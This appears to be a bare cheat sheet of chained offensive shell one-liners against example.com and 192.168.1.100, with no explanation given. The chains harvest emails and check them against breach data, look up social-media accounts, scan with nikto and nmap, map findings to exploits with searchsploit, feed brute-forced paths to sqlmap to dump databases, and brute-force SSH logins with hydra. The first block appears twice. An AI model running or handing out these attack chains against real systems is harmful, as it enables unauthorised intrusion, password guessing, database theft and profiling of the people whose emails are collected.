theHarvester -d example.com -b google | tee emails.txt && \
cat emails.txt | grep "@" | cut -d " " -f2 | xargs -I{} curl -s "https://haveibeenpwned.com/unifiedsearch/{}" | jq && \
sherlock $(cat emails.txt | awk '{print $1}') | tee social_media_accounts.txt



nikto -h https://example.com | tee nikto_output.txt && \
grep "OSVDB" nikto_output.txt | cut -d " " -f2 | xargs -I{} searchsploit {} && \
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 50 | tee gobuster_output.txt && \
cat gobuster_output.txt | awk '{print $1}' | xargs -I{} sqlmap -u "https://example.com{}" --batch --dbs


nmap -p- -sV -T4 192.168.1.100 -oN nmap_scan.txt && \
grep "open" nmap_scan.txt | awk '{print $1}' | cut -d "/" -f1 | xargs -I{} searchsploit {} && \
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh

theHarvester -d example.com -b google | tee emails.txt && \
cat emails.txt | grep "@" | cut -d " " -f2 | xargs -I{} curl -s "https://haveibeenpwned.com/unifiedsearch/{}" | jq && \
sherlock $(cat emails.txt | awk '{print $1}') | tee social_media_accounts.txt